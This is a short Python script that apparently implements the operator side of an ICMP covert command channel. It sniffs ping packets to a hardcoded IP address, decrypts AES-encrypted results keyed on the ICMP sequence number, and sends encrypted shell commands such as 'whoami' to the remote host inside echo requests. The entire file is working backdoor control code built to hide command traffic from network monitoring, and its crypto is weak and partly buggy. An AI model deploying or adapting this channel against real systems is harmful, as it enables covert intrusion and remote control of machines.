from scapy.all import *
from Crypto.Cipher import AES
import base64
from Crypto import Random
import random



BLOCK_SIZE = 16  # Bytes
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \
                chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)
unpad = lambda s: s[:-ord(s[len(s) - 1:])]


target_ip = "47.112.188.203"


key = "SuperSecret" #Insecure and just for testing
plaintext = "Secret message please don't look"

class AESCipher:

    def __init__(self, key):
        self.key = key.encode('utf-8')

    def encrypt(self, raw):
        raw = pad(raw).encode('utf-8')
        iv = Random.new().read( AES.block_size )
        cipher = AES.new( self.key, AES.MODE_CBC, iv )
        return base64.b64encode( iv + cipher.encrypt( raw ) )

    def decrypt(self,encryptstring):
        decrypted = encryptstring.encode()
        decrypted = base64.b64decode(decrypted)
        iv = decrypted[0:16]
        cipher = AES.new( self.key, AES.MODE_CBC, iv )
        result = cipher.decrypt(decrypted)
        result = result[16:-1]
        return result

#paddedKey = key
#cipher = AESCipher(paddedKey)

#encrypted = bytes.decode(cipher.encrypt(plaintext))

#result = cipher.decrypt(encrypted)
#result = bytes.decode(result).rstrip('\0')

def sniff_icmp():

    result = sniff(count=1,filter="icmp",lfilter=lambda x:check_icmp(x[0]))
    result_encrypt = get_result(result[0])
    #result_encrypt = result_encrypt.replace(result_encrypt[0],'')
    print(result_encrypt)
    key = get_key(result[0])

    print(key)
    cipher = AESCipher(key)
    result = cipher.decrypt(result_encrypt)
    print(result)
    result = bytes.decode(result).rstrip('\0')

    return result

def check_icmp(packet):
    if packet.haslayer(ICMP):

        #改成目标ip
        #if packet[IP].src == target_ip:
        if packet[IP].dst == target_ip:
            return True


def get_key(packet):
    key = packet[ICMP].seq
    key = (hex(key)[4:6]+hex(key)[2:4])*4
    return key

def get_result(packet):
    result = packet[Raw].load
    return result.decode()

#-------------------------
#发函数

def send_icmp(command):
    key = random.randint(4096,65535)
    key_encrypt = hex(key)[2:6]*4

    cipher = AESCipher(key_encrypt)
    command_encrypt = cipher.encrypt(command)
    print(key_encrypt)

    packet = IP(dst=target_ip,ttl=64,id=10)/ICMP(type=8,seq=key)/command_encrypt
    send(packet)
#-------------------------


if __name__ == '__main__':

    result = sniff_icmp()
    print(result)
    send_icmp('whoami')
